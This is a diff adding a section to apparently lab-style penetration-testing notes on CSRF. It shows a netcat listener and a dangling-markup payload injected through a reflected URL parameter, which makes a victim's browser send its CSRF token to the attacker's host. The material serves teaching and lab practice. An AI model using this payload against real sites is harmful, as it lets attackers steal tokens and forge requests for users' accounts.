@@ -174,6 +174,17 @@ For GET-based CSRF, we try to sniff the cookie and do the same as previously wit
 </html>
 ```
 
+For POST-based CSRF, we can search for an endpoint where an input is reflected back in the URL. By checking the page source we migt find a `'` character after the value which is reflected back, and abuse it.
+For this we can set up a listener:
+```
+nc -lvnp <PORT>
+```
+and then use a similar payload:
+```
+<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
+```
+If the user visits the crafted URL, we can catch the CSRF token with our netcat listener.
+
 
 
 
